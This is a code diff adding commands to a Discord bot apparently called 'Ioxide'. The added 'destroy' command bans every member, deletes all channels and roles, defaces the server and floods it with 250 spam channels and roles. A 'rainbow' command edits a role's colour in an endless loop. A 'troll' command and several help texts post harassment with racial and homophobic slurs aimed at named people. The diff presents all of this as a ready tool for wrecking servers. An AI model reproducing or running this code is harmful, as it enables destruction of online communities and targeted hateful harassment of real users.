@@ -39,6 +39,10 @@ anti_neg = config.get('anti_neg')
 
 width = os.get_terminal_size().columns
 
+def RandomColor():
+    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
+    return randcolor
+
 def startprint():
     if packer_bot == True:
         packer = "Enabled"
@@ -292,9 +296,81 @@ async def afk(ctx):
 @Ioxide.command()
 async def antineg(ctx):
     await ctx.message.delete()
-    em = discord.Embed(title="_Anti-Negative Help_",color= discord.Color(0x000000))
+    em = discord.Embed(title="_*Anti-Negative Help*_",color= discord.Color(0x000000))
     em.set_image(url="https://media.giphy.com/media/mKAc6ZZqeE4Ao/giphy.gif")
     await ctx.send(embed=em)
+
+@Ioxide.command()
+async def wizzing(ctx):
+    await ctx.message.delete()
+    em = discord.Embed(title="_*Wizzing Help*_",color= discord.Color(0x000000))
+    em.add_field(name="_**Destroy**_",value="Fucks a servers channels and roles",inline=False)
+    em.set_image(url="https://media.giphy.com/media/pVwsBrZyxOlfa/giphy.gif")
+    em.set_footer(text="Dont let this happen to u lol")
+    await ctx.send(embed=em)
+
+@Ioxide.command()
+async def trolling(ctx):
+    await ctx.message.delete()
+    em = discord.Embed(title="_*Trolling Help*_",color= discord.Color(0x000000))
+    em.add_field(name="_**rainbow**_",value="Makes the role you specified rainbow",inline=False)
+    em.add_field(name="_**troll**_",value="Sends a random troll message xd LOL0lL0L",inline=False)
+    em.set_image(url="https://media.giphy.com/media/tyttpHlrsqdQC08orGE/giphy.gif")
+    em.set_footer(text="slang these nuts across yo face nigga LOL")
+    await ctx.send(embed=em)
+
+@Ioxide.command(aliases=['rainbowrole'])
+async def rainbow(ctx, *, role):
+    await ctx.message.delete()
+    role = discord.utils.get(ctx.guild.roles, name=role)
+    while True:
+        try:
+            await role.edit(role=role, colour=RandomColor())
+            await asyncio.sleep(1)
+        except:
+            break
+
+@Ioxide.command()
+async def troll(ctx):
+    await ctx.message.delete()
+    troll1 = "nigga thats why ceed hoed u bitch ass nigga"
+    troll2 = "remember when slang violated you?"
+    troll3 = "bro ceeday said he bitched ur ass on rec LOL"
+    troll4 = "bro why did the nigga named work bitch you? LOOOL"
+    troll5 = "how did rydon flame u he dont even pack lol"
+
+    trolls = [troll1, troll2, troll3, troll4, troll5]
+
+    trollresponse1 = "ceed deez nuts across yo face BITCH ASS NIGGA"
+    trollresponse2 = "slang deez nuts across yo face stupid ass nigga"
+    trollresponse3 = "ceedayz nuts down yo throat ugly ass nigga"
+    trollresponse4 = "work this dick down ur mouth FAGGOT ASS NIGGA"
+    trollresponse5 = "rydon on this dick WEIRD ASS NIGGA LLLL"
+
+    randomTroll = random.choice(trolls)
+
+    if randomTroll == troll1:
+        await ctx.send(troll1)
+        time.sleep(4)
+        await ctx.send(trollresponse1)
+    elif randomTroll == troll2:
+        await ctx.send(troll2)
+        time.sleep(2)
+        await ctx.send(trollresponse2)
+    elif randomTroll == troll3:
+        await ctx.send(troll3)
+        time.sleep(4)
+        await ctx.send(trollresponse3)
+    elif randomTroll == troll4:
+        await ctx.send(troll4)
+        time.sleep(4)
+        await ctx.send(trollresponse4)
+    elif randomTroll == troll5:
+        await ctx.send(troll5)
+        time.sleep(4)
+        await ctx.send(trollresponse5)
+    else:
+        return
 
 @Ioxide.command(aliases=['sayajoke','jokepack'])
 async def joke(ctx):
@@ -332,6 +408,39 @@ async def afkcheck(ctx):
     await ctx.send('1')
     time.sleep(0.8)
     await ctx.send('0')
+
+@Ioxide.command(aliases=['serverdestroy','ruinserver','doafredo'])
+async def destroy(ctx):
+    await ctx.message.delete()
+    for user in list(ctx.guild.members):
+        try:
+            await user.ban()
+        except:
+            pass
+    for channel in list(ctx.guild.channels):
+        try:
+            await channel.delete()
+        except:
+            pass
+    for role in list(ctx.guild.roles):
+        try:
+            await role.delete()
+        except:
+            pass
+    try:
+        await ctx.guild.edit(
+            name=RandString(),
+            description="get fucked by ioxide LOL",
+            reason="cuz ioxideW nigga",
+            icon=None,
+            banner=None
+        )
+    except:
+        pass
+    for _i in range(250):
+        await ctx.guild.create_text_channel(name="ioxide nuked u lol")
+    for _i in range(250):
+        await ctx.guild.create_role(name="ioxideW", color=RandomColor())
 
 if __name__ == '__main__':
     Init()
